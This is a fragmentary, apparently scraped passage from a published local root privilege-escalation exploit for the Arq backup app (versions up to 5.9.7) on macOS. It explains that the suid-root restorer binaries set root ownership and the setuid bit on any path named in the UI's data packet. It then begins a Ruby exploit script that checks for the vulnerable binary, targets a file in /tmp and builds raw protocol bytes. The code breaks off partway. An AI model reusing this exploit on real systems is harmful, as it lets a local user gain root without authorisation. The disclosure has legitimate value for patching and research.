There are three of them ， and they are used to execute restores of backed up files from the various ， cloud providers. ， After reversing the inter-app protocol I discovered that the path to the ， restorer binary was specified as part of the data packet sent by the UI. After ， receiving this , the restorer binaries then set +s and root ownership on this ， path. This means we can specify an arbitrary path which will receive +s and root ， ownership. ， This issue is fixed in Arq 5.10. ， =end ，  #  ! /usr/bin/env ruby ， Arq <= 5.9.7 local root privilege escalation exploit ， by m4rkw - ， s = File.stat ( \"/Applications/Arq.app/Contents/Resources/standardrestorer\" )  ， puts \"Not vulnerable - standardrestorer is not suid root.\" ， exit 1 ， end ， binary_target = \"/tmp/arq_597_exp\" ， d = \"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" ， e = \"\\x00\\x00\\x00\\x00\\x03\" ， z = \"0000\" ， target = s",
